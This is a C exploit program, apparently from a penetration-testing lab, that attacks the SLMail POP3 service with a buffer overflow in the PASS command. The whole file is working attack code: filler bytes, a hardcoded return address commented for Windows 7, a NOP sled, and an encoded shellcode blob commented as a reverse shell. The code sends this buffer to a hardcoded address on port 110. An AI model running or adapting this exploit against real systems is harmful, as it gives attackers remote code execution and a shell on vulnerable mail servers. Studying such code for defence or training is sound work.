#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
char retadd[] = "\x8f\x35\x4a\x5f"; /*win7 pro n 0x5f4a358f*/ 

int port = 110;

/* revshell العراق القراصنة المجموعة*/
/* updated to use appropriate shellcode for our purposes */
 
unsigned char shellcode[] = 
"\xdb\xc7\xb8\x7e\x65\x75\xc5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x13\x03\x3d\x76\x97\x30\x3d\x90\xd5"
"\xbb\xbd\x61\xba\x32\x58\x50\xfa\x21\x29\xc3\xca\x22\x7f\xe8"
"\xa1\x67\x6b\x7b\xc7\xaf\x9c\xcc\x62\x96\x93\xcd\xdf\xea\xb2"
"\x4d\x22\x3f\x14\x6f\xed\x32\x55\xa8\x10\xbe\x07\x61\x5e\x6d"
"\xb7\x06\x2a\xae\x3c\x54\xba\xb6\xa1\x2d\xbd\x97\x74\x25\xe4"
"\x37\x77\xea\x9c\x71\x6f\xef\x99\xc8\x04\xdb\x56\xcb\xcc\x15"
"\x96\x60\x31\x9a\x65\x78\x76\x1d\x96\x0f\x8e\x5d\x2b\x08\x55"
"\x1f\xf7\x9d\x4d\x87\x7c\x05\xa9\x39\x50\xd0\x3a\x35\x1d\x96"
"\x64\x5a\xa0\x7b\x1f\x66\x29\x7a\xcf\xee\x69\x59\xcb\xab\x2a"
"\xc0\x4a\x16\x9c\xfd\x8c\xf9\x41\x58\xc7\x14\x95\xd1\x8a\x70"
"\x5a\xd8\x34\x81\xf4\x6b\x47\xb3\x5b\xc0\xcf\xff\x14\xce\x08"
"\xff\x0e\xb6\x86\xfe\xb0\xc7\x8f\xc4\xe5\x97\xa7\xed\x85\x73"
"\x37\x11\x50\xd3\x67\xbd\x0b\x94\xd7\x7d\xfc\x7c\x3d\x72\x23"
"\x9c\x3e\x58\x4c\x37\xc5\x0b\x79\xc3\xc5\x08\x15\xd1\xc5\x9f"
"\xba\x5c\x23\xf5\x52\x09\xfc\x62\xca\x10\x76\x12\x13\x8f\xf3"
"\x14\x9f\x3c\x04\xda\x68\x48\x16\x8b\x98\x07\x44\x1a\xa6\xbd"
"\xe0\xc0\x35\x5a\xf0\x8f\x25\xf5\xa7\xd8\x98\x0c\x2d\xf5\x83"
"\xa6\x53\x04\x55\x80\xd7\xd3\xa6\x0f\xd6\x96\x93\x2b\xc8\x6e"
"\x1b\x70\xbc\x3e\x4a\x2e\x6a\xf9\x24\x80\xc4\x53\x9a\x4a\x80"
"\x22\xd0\x4c\xd6\x2a\x3d\x3b\x36\x9a\xe8\x7a\x49\x13\x7d\x8b"
"\x32\x49\x1d\x74\xe9\xc9\x3d\x97\x3b\x24\xd6\x0e\xae\x85\xbb"
"\xb0\x05\xc9\xc5\x32\xaf\xb2\x31\x2a\xda\xb7\x7e\xec\x37\xca"
"\xef\x99\x37\x79\x0f\x88";

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
    int sockfd;
    plm.sin_family = AF_INET;
    plm.sin_port = htons(port);
    plm.sin_addr.s_addr = inet_addr(ip);
    bzero(&(plm.sin_zero),8);
    sockfd = socket(AF_INET,SOCK_STREAM,0);
    if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
    {
         perror("[-] connect error!");
         exit(0);
    }
    printf("[*] Connected to: %s.\n",ip);
    return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strncat(buffer, off, 2606);
    strncat(buffer, retadd, 4);
    strncat(buffer, nop, 12);
    strncat(buffer, shellcode, 351);
    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.15.76");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
